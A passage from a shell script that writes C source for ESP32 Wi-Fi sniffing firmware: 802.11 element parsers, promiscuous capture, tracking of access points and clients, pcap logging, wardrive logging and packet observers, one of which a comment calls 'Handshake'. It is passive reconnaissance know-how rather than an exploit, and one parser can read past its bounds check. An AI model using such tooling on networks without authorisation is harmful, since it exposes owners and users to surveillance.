    *out_nbr_count = 0;

    size_t pos = 0;
    while (pos + 2 <= len) {
        uint8_t tag_id = ies[pos];
        uint8_t tag_len = ies[pos + 1];
        if (pos + 2 + tag_len > len) break;

        if (tag_id == IE_NEIGHBOR_REPORT && tag_len >= NBR_MIN_LEN - 2) {
            if (*out_nbr_count < 8) {
                neighbor_entry_t *n = &out_nbrs[*out_nbr_count];
                memcpy(n->bssid, &ies[pos + 2], 6);
                n->channel = ies[pos + 13];
                n->phy_mode = ies[pos + 14];
                (*out_nbr_count)++;
            }
        }
        pos += 2 + tag_len;
    }
    return *out_nbr_count > 0;
}

bool wifi_rrm_parse_btm(const uint8_t *frame, size_t len)
{
    if (frame == NULL || len < 4) return false;
    return (frame[0] == 0 && frame[1] == 6);
}

bool wifi_rrm_capable(const uint8_t *frame, size_t len)
{
    if (frame == NULL || len < 24) return false;
    uint16_t cap = (uint16_t)(frame[10] | ((uint16_t)frame[11] << 8));
    return (cap & 0x1000) != 0;
}

bool wifi_mbssid_parse(const uint8_t *ies, size_t len,
                       bool *out_multi, bool *out_transmitted,
                       uint8_t *out_max_bssid_ind, uint8_t *out_bssid_idx)
{
    if (ies == NULL || len == 0 || out_multi == NULL ||
        out_transmitted == NULL || out_max_bssid_ind == NULL || out_bssid_idx == NULL) {
        return false;
    }
    *out_multi = false;
    *out_transmitted = false;
    *out_max_bssid_ind = 0;
    *out_bssid_idx = 0;

    size_t pos = 0;
    while (pos + 2 <= len) {
        uint8_t tag_id = ies[pos];
        uint8_t tag_len = ies[pos + 1];
        if (pos + 2 + tag_len > len) break;

        if (tag_id == IE_MBSSID && tag_len >= 3) {
            *out_multi = true;
            *out_max_bssid_ind = ies[pos + 2];
            *out_bssid_idx = ies[pos + 3];
            *out_transmitted = (ies[pos + 4] & 0x01) != 0;
            return true;
        }
        pos += 2 + tag_len;
    }
    return false;
}

/* Parse HE Capabilities element (ID 35).
 * Returns true if element present and at least MAC/PHY caps parsed.
 * out_he_capable: true if HE capable
 * out_mcs_nss:    bits 0-3 = NSS, bits 4-7 = MCS index
 * out_ppdu_type:  0=unknown, 1=HE-MU, 2=HE-SU */
bool wifi_he_parse(const uint8_t *ies, size_t len,
                   bool *out_he_capable, uint8_t *out_mcs_nss, uint8_t *out_ppdu_type)
{
    if (ies == NULL || len == 0 || out_he_capable == NULL ||
        out_mcs_nss == NULL || out_ppdu_type == NULL) return false;
    *out_he_capable = false;
    *out_mcs_nss = 0;
    *out_ppdu_type = 0;

    size_t pos = 0;
    while (pos + 2 <= len) {
        uint8_t tag_id = ies[pos];
        uint8_t tag_len = ies[pos + 1];
        if (pos + 2 + tag_len > len) break;

        if (tag_id == IE_HE_CAPABILITIES && tag_len >= 4) {
            /* HE MAC Capabilities Info at bytes 2-3 */
            uint16_t he_mac = (uint16_t)(ies[pos + 2] | ((uint16_t)ies[pos + 3] << 8));
            (void)he_mac;

            /* HE PHY Capabilities Info at bytes 4-5 */
            uint16_t he_phy = (uint16_t)(ies[pos + 4] | ((uint16_t)ies[pos + 5] << 8));

            /* Supported HE-MCS and NSS set at bytes 6-7 */
            uint8_t mcs_nss = ies[pos + 6];

            /* Determine PPDU type from PHY caps:
             * Bit 1 = HE-SU PPDU capable
             * Bit 2 = HE-ER-SU PPDU capable
             * Bit 3 = HE-MU PPDU capable */
            if (he_phy & 0x02) *out_ppdu_type = 2; /* HE-SU */
            else if (he_phy & 0x08) *out_ppdu_type = 1; /* HE-MU */

            /* Extract NSS: bits 0-3 of MCS/NSS field */
            uint8_t nss = mcs_nss & 0x0F;
            /* Extract MCS index: bits 4-7 */
            uint8_t mcs = (mcs_nss >> 4) & 0x0F;

            *out_he_capable = true;
            *out_mcs_nss = ((mcs & 0x0F) << 4) | (nss & 0x0F);
            return true;
        }
        pos += 2 + tag_len;
    }
    return false;
}

EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/wifi_rrm.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/wifi_sniffer.c"
#include "channel_hopper.h"
#include "wifi_sniffer.h"
#include "led_indicator.h"
#include "storage_sd.h"
#include "pcap_ring.h"
#include "wifi_rrm.h"
#include "wardrive.h"
#include "export.h"
#include "ai_training.h"
#include "reaction_rules.h"

#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_mac.h"
#include "esp_netif.h"
#include "esp_timer.h"
#include "esp_heap_caps.h"
#include "esp_log.h"

#include <stdatomic.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <ctype.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "freertos/semphr.h"

static const char *TAG = "wifi_sniffer";

#define WIFI_QUEUE_LEN    64
#define WIFI_MAX_PAYLOAD  2346 
#define MAX_OBSERVERS     16

atomic_bool g_wifi_sniffer_active = ATOMIC_VAR_INIT(false);
_Atomic uint8_t g_wifi_fixed_channel = 0;

static ap_info_t g_ap_list[MAX_DISCOVERED_APS];
static uint16_t g_ap_count = 0;

static client_info_t g_client_list[MAX_DISCOVERED_CLIENTS];
static uint16_t g_client_count = 0;

static wifi_stats_t g_wifi_stats;
static atomic_bool g_wifi_init_done = ATOMIC_VAR_INIT(false);

static QueueHandle_t g_wifi_pkt_queue = NULL;
static SemaphoreHandle_t g_wifi_lock = NULL;
static SemaphoreHandle_t g_pcap_mutex = NULL;
static esp_timer_handle_t g_sniff_timer = NULL;

static void sniff_timer_cb(void *arg) {
    (void)arg;
    wifi_sniffer_stop();
}

static volatile uint32_t g_wifi_alloc_drop = 0;
static volatile uint32_t g_wifi_queue_drop = 0;

static FILE *g_pcap_file = NULL;
static char g_pcap_path[64] = {0};
static atomic_bool g_pcap_active = ATOMIC_VAR_INIT(false);

/* Observer registry */
static wifi_pkt_observer_cb g_observers[MAX_OBSERVERS];
static uint8_t g_observer_count = 0;

static inline void atomic_inc_u32(volatile uint32_t *v) {
    __atomic_fetch_add((uint32_t *)v, 1, __ATOMIC_RELAXED);
}
static inline uint32_t atomic_load_u32(volatile uint32_t *v) {
    return __atomic_load_n((uint32_t *)v, __ATOMIC_RELAXED);
}

esp_err_t wifi_sniffer_register_observer(wifi_pkt_observer_cb cb) {
    if (!cb) return ESP_ERR_INVALID_ARG;
    if (g_observer_count >= MAX_OBSERVERS) return ESP_ERR_NO_MEM;
    g_observers[g_observer_count++] = cb;
    ESP_LOGI(TAG, "Registered packet observer (%d/%d)", g_observer_count, MAX_OBSERVERS);
    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  Helpers
 * ----------------------------------------------------------------------- */
static bool mac_is_valid_unicast(const uint8_t *mac) {
    if (!mac || (mac[0] & 0x01) != 0) return false;
    static const uint8_t zero_mac[6] = {0};
    static const uint8_t bcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    return memcmp(mac, zero_mac, 6) != 0 && memcmp(mac, bcast_mac, 6) != 0;
}

static void sanitize_ssid(char *ssid) {
    if (!ssid) return;
    for (int i = 0; ssid[i] != '\0'; i++) {
        if (!isprint((unsigned char)ssid[i])) ssid[i] = ' ';
    }
}

static bool parse_ssid_tag(const uint8_t *frame, size_t len, size_t offset, char *ssid, size_t ssid_sz) {
    if (!ssid || ssid_sz == 0 || !frame || len <= offset) return false;
    ssid[0] = '\0';
    size_t pos = offset;
    while (pos + 2 <= len) {
        uint8_t tag_id = frame[pos];
        uint8_t tag_len = frame[pos + 1];
        if (pos + 2 + tag_len > len) break;
        if (tag_id == 0) {
            size_t copy_len = (tag_len >= ssid_sz) ? (ssid_sz - 1) : tag_len;
            memcpy(ssid, &frame[pos + 2], copy_len);
            ssid[copy_len] = '\0';
            sanitize_ssid(ssid);
            return true;
        }
        pos += 2 + tag_len;
    }
    return false;
}

/* -------------------------------------------------------------------------
 *  Advanced IE Parsing (RSN, MBSSID, HE, Country)
 * ----------------------------------------------------------------------- */
typedef struct {
    bool pmf_capable;
    bool pmf_required;
    uint16_t rsn_version;
    bool wpa3_sae;
    uint8_t akm_count;
    bool has_rrm;
    bool has_btm;
    neighbor_entry_t nbrs[8];
    uint8_t nbr_count;
    bool is_multi_bssid;
    bool is_transmitted_bssid;
    uint8_t max_bssid_indicator;
    uint8_t bssid_index;
    bool he_capable;
    uint8_t he_mcs_nss;
    uint8_t he_ppdu_type;
    bool regdom_present;
    char country_code[3];
    uint8_t reg_class;
    uint8_t max_tx_power;
} ap_features_t;

static bool pmf_parse_rsn(const uint8_t *ies, size_t len, ap_features_t *feat) {
    if (!ies || len == 0 || !feat) return false;
    size_t pos = 0;
    while (pos + 2 <= len) {
        uint8_t tag_id = ies[pos];
        uint8_t tag_len = ies[pos + 1];
        if (pos + 2 + tag_len > len) break;

        if (tag_id == 48 && tag_len >= 2) {
            feat->rsn_version = ies[pos + 2] | ((uint16_t)ies[pos + 3] << 8);
            size_t offset = 4; 
            if (offset + 4 > tag_len) break; 
            offset += 4;
            if (offset + 2 > tag_len) break; 
            uint16_t pw_count = ies[pos + offset] | ((uint16_t)ies[pos + offset + 1] << 8);
            offset += 2 + (pw_count * 4);
            if (offset + 2 > tag_len) break; 
            uint16_t akm_count = ies[pos + offset] | ((uint16_t)ies[pos + offset + 1] << 8);
            feat->akm_count = (akm_count > 255) ? 255 : akm_count;
            offset += 2;
            for (uint16_t k = 0; k < akm_count; k++) {
                if (offset + 4 > tag_len) break;
                if (ies[pos + offset] == 0x00 && ies[pos + offset + 1] == 0x0F && 
                    ies[pos + offset + 2] == 0xAC && ies[pos + offset + 3] == 0x08) {
                    feat->wpa3_sae = true;
                }
                offset += 4;
            }
            if (offset + 2 <= tag_len) {
                uint16_t caps = ies[pos + offset] | ((uint16_t)ies[pos + offset + 1] << 8);
                feat->pmf_capable = (caps & 0x0040) != 0; /* Bit 6: MFPC */
                feat->pmf_required = (caps & 0x0080) != 0; /* Bit 7: MFPR */
            }
            return true;
        }
        pos += 2 + tag_len;
    }
    return false;
}

static bool sniffer_mbssid_parse(const uint8_t *ies, size_t len, ap_features_t *feat) {
    if (!ies || len == 0 || !feat) return false;
    size_t pos = 0;
    while (pos + 2 <= len) {
        uint8_t tag_id = ies[pos];
        uint8_t tag_len = ies[pos + 1];
        if (pos + 2 + tag_len > len) break;
        if (tag_id == 55 && tag_len >= 3) {
            feat->is_multi_bssid = true;
            feat->max_bssid_indicator = ies[pos + 2];
            feat->bssid_index = ies[pos + 3];
            feat->is_transmitted_bssid = (ies[pos + 4] & 0x01) != 0;
            return true;
        }
        pos += 2 + tag_len;
    }
    return false;
}

/* -------------------------------------------------------------------------
 *  State Management
 * ----------------------------------------------------------------------- */
static void add_ap_locked(const uint8_t *bssid, const char *ssid, int8_t rssi, uint8_t channel, const ap_features_t *feat) {
    if (!mac_is_valid_unicast(bssid)) return;

    for (int i = 0; i < g_ap_count; i++) {
        if (memcmp(g_ap_list[i].bssid, bssid, 6) == 0) {
            g_ap_list[i].rssi = rssi;
            g_ap_list[i].channel = channel;
            g_ap_list[i].pkt_count++;
            if (ssid && ssid[0] != '\0' && (g_ap_list[i].ssid[0] == '\0' || strcmp(g_ap_list[i].ssid, "<HIDDEN>") == 0)) {
                snprintf(g_ap_list[i].ssid, sizeof(g_ap_list[i].ssid), "%s", ssid);
            }
            if (feat) {
                if (feat->pmf_capable) {
                    g_ap_list[i].pmf_capable = true;
                    g_ap_list[i].pmf_required = feat->pmf_required;
                    g_ap_list[i].rsn_version = feat->rsn_version;
                }
                if (feat->wpa3_sae) {
                    g_ap_list[i].wpa3_sae = true;
                    g_ap_list[i].akm_count = feat->akm_count;
                }
                if (feat->has_rrm) g_ap_list[i].has_rrm = true;
                if (feat->has_btm) g_ap_list[i].has_btm = true;
                if (feat->nbr_count > 0) {
                    uint8_t copy = (feat->nbr_count < sizeof(g_ap_list[i].neighbors) / sizeof(neighbor_entry_t)) ? feat->nbr_count : sizeof(g_ap_list[i].neighbors) / sizeof(neighbor_entry_t);
                    memcpy(g_ap_list[i].neighbors, feat->nbrs, copy * sizeof(neighbor_entry_t));
                    g_ap_list[i].neighbor_count = copy;
                }
                if (feat->is_multi_bssid) {
                    g_ap_list[i].is_multi_bssid = true;
                    g_ap_list[i].is_transmitted_bssid = feat->is_transmitted_bssid;
                    g_ap_list[i].max_bssid_indicator = feat->max_bssid_indicator;
                    g_ap_list[i].bssid_index = feat->bssid_index;
                }
                if (feat->he_capable) {
                    g_ap_list[i].he_capable = true;
                    g_ap_list[i].he_mcs_nss = feat->he_mcs_nss;
                    g_ap_list[i].he_ppdu_type = feat->he_ppdu_type;
                }
                if (feat->regdom_present) {
                    g_ap_list[i].regdom_present = true;
                    memcpy(g_ap_list[i].country_code, feat->country_code, 2);
                    g_ap_list[i].country_code[2] = 0;
                    g_ap_list[i].reg_class = feat->reg_class;
                    g_ap_list[i].max_tx_power = feat->max_tx_power;
                }
            }
            return;
        }
    }

    if (g_ap_count < MAX_DISCOVERED_APS) {
        memcpy(g_ap_list[g_ap_count].bssid, bssid, 6);
        snprintf(g_ap_list[g_ap_count].ssid, sizeof(g_ap_list[g_ap_count].ssid), "%s", (ssid && ssid[0] != '\0') ? ssid : "<HIDDEN>");
        g_ap_list[g_ap_count].rssi = rssi;
        g_ap_list[g_ap_count].channel = channel;
        g_ap_list[g_ap_count].pkt_count = 1;
        if (feat) {
            g_ap_list[g_ap_count].pmf_capable = feat->pmf_capable;
            g_ap_list[g_ap_count].pmf_required = feat->pmf_required;
            g_ap_list[g_ap_count].rsn_version = feat->rsn_version;
            g_ap_list[g_ap_count].wpa3_sae = feat->wpa3_sae;
            g_ap_list[g_ap_count].akm_count = feat->akm_count;
            g_ap_list[g_ap_count].has_rrm = feat->has_rrm;
            g_ap_list[g_ap_count].has_btm = feat->has_btm;
            if (feat->nbr_count > 0) {
                uint8_t copy = (feat->nbr_count < sizeof(g_ap_list[g_ap_count].neighbors) / sizeof(neighbor_entry_t)) ? feat->nbr_count : sizeof(g_ap_list[g_ap_count].neighbors) / sizeof(neighbor_entry_t);
                memcpy(g_ap_list[g_ap_count].neighbors, feat->nbrs, copy * sizeof(neighbor_entry_t));
                g_ap_list[g_ap_count].neighbor_count = copy;
            }
            g_ap_list[g_ap_count].is_multi_bssid = feat->is_multi_bssid;
            g_ap_list[g_ap_count].is_transmitted_bssid = feat->is_transmitted_bssid;
            g_ap_list[g_ap_count].max_bssid_indicator = feat->max_bssid_indicator;
            g_ap_list[g_ap_count].bssid_index = feat->bssid_index;
            g_ap_list[g_ap_count].he_capable = feat->he_capable;
            g_ap_list[g_ap_count].he_mcs_nss = feat->he_mcs_nss;
            g_ap_list[g_ap_count].he_ppdu_type = feat->he_ppdu_type;
            g_ap_list[g_ap_count].regdom_present = feat->regdom_present;
            if (feat->regdom_present) {
                memcpy(g_ap_list[g_ap_count].country_code, feat->country_code, 2);
                g_ap_list[g_ap_count].country_code[2] = 0;
                g_ap_list[g_ap_count].reg_class = feat->reg_class;
                g_ap_list[g_ap_count].max_tx_power = feat->max_tx_power;
            }
        }
        g_ap_count++;
    }
}

static void touch_ap_locked(const uint8_t *bssid, int8_t rssi, uint8_t channel) {
    if (!mac_is_valid_unicast(bssid)) return;
    for (int i = 0; i < g_ap_count; i++) {
        if (memcmp(g_ap_list[i].bssid, bssid, 6) == 0) {
            g_ap_list[i].rssi = rssi;
            g_ap_list[i].channel = channel;
            g_ap_list[i].pkt_count++;
            reaction_rules_check_ap(bssid, g_ap_list[i].ssid); /* FIXED: pass actual SSID */
            return;
        }
    }
}

static void add_client_locked(const uint8_t *client_mac, const uint8_t *ap_bssid, int8_t rssi, uint8_t channel) {
    if (!mac_is_valid_unicast(client_mac)) return;
    bool ap_valid = ap_bssid && mac_is_valid_unicast(ap_bssid);

    for (int i = 0; i < g_client_count; i++) {
        if (memcmp(g_client_list[i].mac, client_mac, 6) == 0) {
            g_client_list[i].rssi = rssi;
            g_client_list[i].channel = channel;
            g_client_list[i].pkt_count++;
            if (ap_valid) memcpy(g_client_list[i].ap_bssid, ap_bssid, 6);
            return;
        }
    }

    if (g_client_count < MAX_DISCOVERED_CLIENTS) {
        memcpy(g_client_list[g_client_count].mac, client_mac, 6);
        if (ap_valid) memcpy(g_client_list[g_client_count].ap_bssid, ap_bssid, 6);
        else memset(g_client_list[g_client_count].ap_bssid, 0, 6);
        g_client_list[g_client_count].rssi = rssi;
        g_client_list[g_client_count].channel = channel;
        g_client_list[g_client_count].pkt_count = 1;
        g_client_count++;
    }
}

/* -------------------------------------------------------------------------
 *  Getters (Thread-safe)
 * ----------------------------------------------------------------------- */
bool wifi_sniffer_get_security(const uint8_t *bssid, bool *out_pmf_required, bool *out_wpa3_sae) {
    if (!bssid || !out_pmf_required || !out_wpa3_sae || !g_wifi_lock) return false;
    *out_pmf_required = false; *out_wpa3_sae = false;
    xSemaphoreTake(g_wifi_lock, portMAX_DELAY);
    for (int i = 0; i < g_ap_count; i++) {
        if (memcmp(g_ap_list[i].bssid, bssid, 6) == 0) {
            *out_pmf_required = g_ap_list[i].pmf_required;
            *out_wpa3_sae = g_ap_list[i].wpa3_sae;
            xSemaphoreGive(g_wifi_lock); return true;
        }
    }
    xSemaphoreGive(g_wifi_lock); return false;
}

bool wifi_sniffer_get_rssi(const uint8_t *bssid, int8_t *out_rssi) {
    if (!bssid || !out_rssi || !g_wifi_lock) return false;
    *out_rssi = -100;
    xSemaphoreTake(g_wifi_lock, portMAX_DELAY);
    for (int i = 0; i < g_ap_count; i++) {
        if (memcmp(g_ap_list[i].bssid, bssid, 6) == 0) {
            *out_rssi = g_ap_list[i].rssi;
            xSemaphoreGive(g_wifi_lock); return true;
        }
    }
    xSemaphoreGive(g_wifi_lock); return false;
}

void wifi_sniffer_get_ssid_for_bssid(const uint8_t *bssid, char *out_ssid, size_t max_len) {
    if (!bssid || !out_ssid || max_len == 0 || !g_wifi_lock) return;
    xSemaphoreTake(g_wifi_lock, portMAX_DELAY);
    for (int i = 0; i < g_ap_count; i++) {
        if (memcmp(g_ap_list[i].bssid, bssid, 6) == 0) {
            snprintf(out_ssid, max_len, "%s", g_ap_list[i].ssid);
            xSemaphoreGive(g_wifi_lock); return;
        }
    }
    xSemaphoreGive(g_wifi_lock);
}

void wifi_sniffer_get_ap_bssid_and_channel_for_client(const uint8_t *client_mac, uint8_t *out_bssid, uint8_t *out_channel) {
    if (!client_mac || !g_wifi_lock) return;
    xSemaphoreTake(g_wifi_lock, portMAX_DELAY);
    for (int i = 0; i < g_client_count; i++) {
        if (memcmp(g_client_list[i].mac, client_mac, 6) == 0) {
            if (out_bssid) memcpy(out_bssid, g_client_list[i].ap_bssid, 6);
            if (out_channel) *out_channel = g_client_list[i].channel;
            xSemaphoreGive(g_wifi_lock); return;
        }
    }
    xSemaphoreGive(g_wifi_lock);
}

bool wifi_sniffer_get_channel_for_bssid(const uint8_t *bssid, uint8_t *out_channel) {
    if (!bssid || !out_channel || !g_wifi_lock) return false;
    xSemaphoreTake(g_wifi_lock, portMAX_DELAY);
    for (int i = 0; i < g_ap_count; i++) {
        if (memcmp(g_ap_list[i].bssid, bssid, 6) == 0) {
            *out_channel = g_ap_list[i].channel;
            xSemaphoreGive(g_wifi_lock); return true;
        }
    }
    xSemaphoreGive(g_wifi_lock); return false;
}

bool wifi_sniffer_get_neighbors(const uint8_t *bssid, neighbor_entry_t *out, uint8_t max, uint8_t *out_count) {
    if (!bssid || !out || max == 0 || !out_count || !g_wifi_lock) return false;
    *out_count = 0;
    xSemaphoreTake(g_wifi_lock, portMAX_DELAY);
    for (int i = 0; i < g_ap_count; i++) {
        if (memcmp(g_ap_list[i].bssid, bssid, 6) == 0) {
            uint8_t copy = g_ap_list[i].neighbor_count;
            if (copy > max) copy = max;
            memcpy(out, g_ap_list[i].neighbors, copy * sizeof(neighbor_entry_t));
            *out_count = copy;
            xSemaphoreGive(g_wifi_lock); return true;
        }
    }
    xSemaphoreGive(g_wifi_lock); return false;
}

bool wifi_sniffer_get_rrm_btm(const uint8_t *bssid, bool *out_rrm, bool *out_btm) {
    if (!bssid || !out_rrm || !out_btm || !g_wifi_lock) return false;
    *out_rrm = false; *out_btm = false;
    xSemaphoreTake(g_wifi_lock, portMAX_DELAY);
    for (int i = 0; i < g_ap_count; i++) {
        if (memcmp(g_ap_list[i].bssid, bssid, 6) == 0) {
            *out_rrm = g_ap_list[i].has_rrm;
            *out_btm = g_ap_list[i].has_btm;
            xSemaphoreGive(g_wifi_lock); return true;
        }
    }
    xSemaphoreGive(g_wifi_lock); return false;
}

bool wifi_sniffer_get_mbssid(const uint8_t *bssid, bool *out_multi, bool *out_transmitted, uint8_t *out_max_ind, uint8_t *out_idx) {
    if (!bssid || !out_multi || !g_wifi_lock) return false;
    *out_multi = false;
    if (out_transmitted) *out_transmitted = false;
    if (out_max_ind) *out_max_ind = 0;
    if (out_idx) *out_idx = 0;
    xSemaphoreTake(g_wifi_lock, portMAX_DELAY);
    for (int i = 0; i < g_ap_count; i++) {
        if (memcmp(g_ap_list[i].bssid, bssid, 6) == 0) {
            *out_multi = g_ap_list[i].is_multi_bssid;
            if (out_transmitted) *out_transmitted = g_ap_list[i].is_transmitted_bssid;
            if (out_max_ind) *out_max_ind = g_ap_list[i].max_bssid_indicator;
            if (out_idx) *out_idx = g_ap_list[i].bssid_index;
            xSemaphoreGive(g_wifi_lock); return true;
        }
    }
    xSemaphoreGive(g_wifi_lock); return false;
}

bool wifi_sniffer_get_he(const uint8_t *bssid, bool *out_he, uint8_t *out_mcs_nss, uint8_t *out_ppdu_type) {
    if (!bssid || !out_he || !g_wifi_lock) return false;
    *out_he = false;
    if (out_mcs_nss) *out_mcs_nss = 0;
    if (out_ppdu_type) *out_ppdu_type = 0;
    xSemaphoreTake(g_wifi_lock, portMAX_DELAY);
    for (int i = 0; i < g_ap_count; i++) {
        if (memcmp(g_ap_list[i].bssid, bssid, 6) == 0) {
            *out_he = g_ap_list[i].he_capable;
            if (out_mcs_nss) *out_mcs_nss = g_ap_list[i].he_mcs_nss;
            if (out_ppdu_type) *out_ppdu_type = g_ap_list[i].he_ppdu_type;
            xSemaphoreGive(g_wifi_lock); return true;
        }
    }
    xSemaphoreGive(g_wifi_lock); return false;
}

bool wifi_sniffer_get_country(const uint8_t *bssid, char *out_country_code, size_t cc_sz, uint8_t *out_reg_class, uint8_t *out_max_tx_power) {
    if (!bssid || !out_country_code || cc_sz < 3 || !g_wifi_lock) return false;
    out_country_code[0] = '\0';
    if (out_reg_class) *out_reg_class = 0;
    if (out_max_tx_power) *out_max_tx_power = 0;
    xSemaphoreTake(g_wifi_lock, portMAX_DELAY);
    for (int i = 0; i < g_ap_count; i++) {
        if (memcmp(g_ap_list[i].bssid, bssid, 6) == 0) {
            if (g_ap_list[i].regdom_present) {
                memcpy(out_country_code, g_ap_list[i].country_code, 2);
                out_country_code[2] = '\0';
                if (out_reg_class) *out_reg_class = g_ap_list[i].reg_class;
                if (out_max_tx_power) *out_max_tx_power = g_ap_list[i].max_tx_power;
            }
            xSemaphoreGive(g_wifi_lock); return g_ap_list[i].regdom_present;
        }
    }
    xSemaphoreGive(g_wifi_lock); return false;
}

uint16_t wifi_sniffer_get_ap_count(void) { return g_ap_count; }
uint16_t wifi_sniffer_get_client_count(void) { return g_client_count; }

/* -------------------------------------------------------------------------
 *  PCAP File I/O
 * ----------------------------------------------------------------------- */
static esp_err_t pcap_open(void) {
    if (!storage_is_ready() || !g_pcap_mutex) return ESP_ERR_INVALID_STATE;
    xSemaphoreTake(g_pcap_mutex, portMAX_DELAY);
    if (g_pcap_file) { xSemaphoreGive(g_pcap_mutex); return ESP_ERR_INVALID_STATE; }

    snprintf(g_pcap_path, sizeof(g_pcap_path), "/sd/sniff_%" PRId64 ".pcap", esp_timer_get_time());
    g_pcap_file = fopen(g_pcap_path, "wb");
    if (!g_pcap_file) { xSemaphoreGive(g_pcap_mutex); return ESP_FAIL; }

    pcap_file_header_t hdr = {
        .magic = 0xa1b2c3d4, .version_major = 2, .version_minor = 4,
        .thiszone = 0, .sigfigs = 0, .snaplen = WIFI_MAX_PAYLOAD, .network = 105
    };
    if (fwrite(&hdr, 1, sizeof(hdr), g_pcap_file) != sizeof(hdr)) {
        fclose(g_pcap_file); g_pcap_file = NULL;
        xSemaphoreGive(g_pcap_mutex); return ESP_FAIL;
    }
    atomic_store(&g_pcap_active, true);
    xSemaphoreGive(g_pcap_mutex);
    return ESP_OK;
}

static void pcap_close(void) {
    if (!g_pcap_mutex) return;
    xSemaphoreTake(g_pcap_mutex, portMAX_DELAY);
    atomic_store(&g_pcap_active, false);
    if (g_pcap_file) { fclose(g_pcap_file); g_pcap_file = NULL; }
    xSemaphoreGive(g_pcap_mutex);
}

static void pcap_write(const uint8_t *data, size_t len, const struct timeval *tv) {
    if (!g_pcap_mutex || !data || len == 0 || !tv) return;
    xSemaphoreTake(g_pcap_mutex, portMAX_DELAY);
    if (atomic_load(&g_pcap_active) && g_pcap_file) {
        pcaprec_hdr_t rec = {
            .ts_sec = (uint32_t)tv->tv_sec, .ts_usec = (uint32_t)tv->tv_usec,
            .incl_len = (uint32_t)len, .orig_len = (uint32_t)len
        };
        fwrite(&rec, 1, sizeof(rec), g_pcap_file);
        fwrite(data, 1, len, g_pcap_file);
    }
    xSemaphoreGive(g_pcap_mutex);
}

/* -------------------------------------------------------------------------
 *  Packet Parsing Core
 * ----------------------------------------------------------------------- */
static void channel_hop_record_locked(uint8_t channel, uint8_t type, uint8_t subtype, int8_t rssi, size_t len) {
    uint32_t mgmt = (type == 0) ? 1 : 0;
    uint32_t beacon = (type == 0 && subtype == 8) ? 1 : 0;
    uint32_t data = (type == 2) ? 1 : 0;
    channel_hopper_record_packet(channel, 1, mgmt, beacon, data, rssi);
}

static void parse_wifi_packet(const wifi_pkt_msg_t *msg) {
    if (!msg || !msg->payload || !g_wifi_lock) return;

    const uint8_t *data = msg->payload;
    size_t len = msg->len;
    if (len < sizeof(wifi_ieee80211_mac_hdr_t)) return;

    const wifi_ieee80211_mac_hdr_t *hdr = (const wifi_ieee80211_mac_hdr_t *)data;
    uint16_t fc = hdr->frame_ctrl;
    uint8_t type = (fc >> 2) & 0x03;
    uint8_t subtype = (fc >> 4) & 0x0F;

    xSemaphoreTake(g_wifi_lock, portMAX_DELAY);

    if (type == 0) {
        g_wifi_stats.total_mgmt++;
        if (subtype == 8 || subtype == 5) {
            if (subtype == 8) g_wifi_stats.beacon++; else g_wifi_stats.probe_resp++;
            char ssid[33] = {0};
            parse_ssid_tag(data, len, 36, ssid, sizeof(ssid));
            
            ap_features_t feat = {0};
            pmf_parse_rsn(data + 24, len - 24, &feat);
            feat.has_rrm = wifi_rrm_parse_beacon(data + 24, len - 24, feat.nbrs, &feat.nbr_count);
            feat.has_btm = wifi_rrm_parse_btm(data + 24, len - 24);
            sniffer_mbssid_parse(data + 24, len - 24, &feat);
            /* TODO: Add wifi_he_parse and wifi_country_parse here if defined in wifi_rrm.h */
            
            add_ap_locked(hdr->addr3, ssid, msg->rssi, msg->channel, &feat);

            if (wardrive_get_mode() != WARDIRVE_MODE_OFF) {
                char mac[18];
                snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                         hdr->addr3[0], hdr->addr3[1], hdr->addr3[2],
                         hdr->addr3[3], hdr->addr3[4], hdr->addr3[5]);
                wardrive_log_wifi(mac, ssid, msg->rssi, msg->channel,
                                  feat.wpa3_sae ? "WPA3" : (feat.rsn_version ? "WPA2" : "WPA"));
            }
        } else if (subtype == 4) {
            g_wifi_stats.probe_req++;
            add_client_locked(hdr->addr2, NULL, msg->rssi, msg->channel);
        } else if (subtype == 12) {
            g_wifi_stats.deauth++;
        } else if (subtype == 10) {
            g_wifi_stats.disassoc++;
        } else {
            add_client_locked(hdr->addr2, NULL, msg->rssi, msg->channel);
        }
    } else if (type == 2) {
        g_wifi_stats.total_data++;
        bool to_ds = (fc & 0x0100) != 0;
        bool from_ds = (fc & 0x0200) != 0;

        const uint8_t *client_mac = NULL, *ap_mac = NULL;
        if (!to_ds && !from_ds) { client_mac = hdr->addr2; ap_mac = hdr->addr3; }
        else if (to_ds && !from_ds) { client_mac = hdr->addr2; ap_mac = hdr->addr1; }
        else if (!to_ds && from_ds) { client_mac = hdr->addr1; ap_mac = hdr->addr2; }
        else { client_mac = hdr->addr2; ap_mac = hdr->addr3; }

        add_client_locked(client_mac, ap_mac, msg->rssi, msg->channel);
        if (ap_mac && mac_is_valid_unicast(ap_mac)) touch_ap_locked(ap_mac, msg->rssi, msg->channel);
    }

    if (channel_hopper_is_active()) channel_hop_record_locked(msg->channel, type, subtype, msg->rssi, len);
    xSemaphoreGive(g_wifi_lock);
}

/* -------------------------------------------------------------------------
 *  Worker Task & Promiscuous Callback
 * ----------------------------------------------------------------------- */
static void wifi_pkt_worker_task(void *arg) {
    wifi_pkt_msg_t msg;
    while (1) {
        if (xQueueReceive(g_wifi_pkt_queue, &msg, portMAX_DELAY) == pdTRUE) {
            if (msg.payload) {
                if (atomic_load(&g_wifi_sniffer_active)) {
                    parse_wifi_packet(&msg);
                    /* Broadcast to all registered observers (AI, ARP, Handshake, etc.) */
                    for (uint8_t i = 0; i < g_observer_count; i++) {
                        if (g_observers[i]) g_observers[i](&msg);
                    }
                }
                if (atomic_load(&g_pcap_active)) {
                    pcap_write(msg.payload, msg.len, &msg.tv);
                    export_write_packet(msg.payload, msg.len, msg.channel, msg.rssi, msg.tv.tv_sec * 1000000ULL + msg.tv.tv_usec);
                    if (ai_train_get_mode() != AI_TRAIN_MODE_OFF) {
                        ai_train_label_wifi(NULL, msg.payload, msg.len, msg.channel, msg.rssi, msg.tv.tv_sec * 1000000ULL + msg.tv.tv_usec);
                    }
                }
